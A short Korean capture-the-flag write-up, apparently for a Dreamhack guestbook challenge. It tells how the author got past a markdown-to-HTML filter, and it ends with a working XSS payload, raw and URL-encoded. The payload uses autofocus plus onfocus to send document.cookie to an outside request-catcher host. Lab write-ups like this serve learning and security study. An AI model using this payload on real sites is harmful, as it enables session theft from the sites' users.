## 풀이

정말 여러가지 삽질을 했다..
ontransitionend 같은 속성도 써보고, style injection 등 여러가지 시도했는데
ontransitionend는 절대 자동 실행이 아니었고,
style injection은 실행은 잘 되는데 document.cookie를 가져올 수 없었다.

정말 어이없는 풀이를 설명듣고 풀었는데, autofocus + onfocus의 조합으로 푸는 것이다..
a 태그 관련해서 검색했을 때 autofocus가 안나와서 넘어갔었는데,
autofocus는 모든 element에서 사용가능한 global attribute라서 사용할 수 있는 것이다.

페이로드는 다음과 같다.

```markdown
[something](#' autofocus onfocus='location.href="https://qftaypc.request.dreamhack.games/?cookie=" + document.cookie)

/GuestBook.php?content=%5Bsomething%5D%28%23%27+autofocus+onfocus%3D%27location.href%3D%22https%3A%2F%2Fqftaypc.request.dreamhack.games%2F%3Fcookie%3D%22+%2B+document.cookie%29
```